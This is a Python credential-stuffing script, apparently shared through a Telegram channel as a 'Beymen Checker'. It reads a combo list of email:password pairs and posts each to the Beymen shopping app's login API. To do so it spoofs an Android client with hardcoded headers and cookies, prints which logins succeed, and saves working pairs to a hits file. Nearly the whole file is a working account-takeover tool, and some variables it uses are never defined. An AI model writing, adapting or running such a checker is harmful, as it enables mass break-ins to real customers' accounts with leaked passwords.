import requests, time
from cfonts import render

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Chanel  : {B}JED ~ ARCHIVE |
|{Z}[+] Tool  : {B} Beymen Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')



def shelby(username, password):
    login_url = "https://www.beymen.com/mobile2/mbUser/loginv2"
    login_headers={'User-Agent':"Beymen/3.24.2 Android/Android11 CHZ/(Redmi Redmi Note 8 Pro) BGRP/0",'Accept-Encoding':"gzip",'Content-Type':"application/x-www-form-urlencoded",'phonetype':"Redmi Note 8 Pro",'osversion':"30",'appversion':"3.24.2",'platform':"Android",'session_id':"B3B0F1B7-4419-4684-B0F4-0FBBF0B7A262",'Cookie':"Entegral.CookieKey.CouponTicket=TleDQCIYM1I6GD/JMMIBUnEHSmGjdAPVbWAskxU6a9Q=; FirstVisitDate=sihqFivEGVhau95Lyg+GBzGg5FfD49eexG4+BYq98fg=; visid_incap_2753670=4GE8eJzBQD2OG6RnoUacZmPOTGcAAAAAQUIPAAAAAABD0jH435/RiE5lpKcS3/tQ"}
    login_payload = f"email={username}&password={password}"
    try:
        response = requests.post(login_url, headers=login_headers, data=login_payload, timeout=10)
        if response.status_code == 200:
            result = response.json()
            if result.get("Success"):   
                return True, result["Result"]["FullName"]
            else:
                return False, result["Exception"]["Message"]
    except requests.exceptions.RequestException as e:
        print(f"")
        time.sleep(2)
    return False, "Bilinmeyen hata"
    
    


        
        
def ulus(purna):
    with open(purna, "r") as file:
        for line in file:
            username, password = line.strip().split(":")
            success, message = shelby(username, password)
            if success:
                with open(zeroooo, "a") as hit_file:
                    hit_file.write(f"{username}:{password}\n")
                print(f"{T}Giriş başarılı✅: {username}:{password} ")
            else:
                print(f"{Z}Giriş başarısız❌: {username}:{password} ")
combo = input(" ~ Combo gir : ")
ulus(combo)


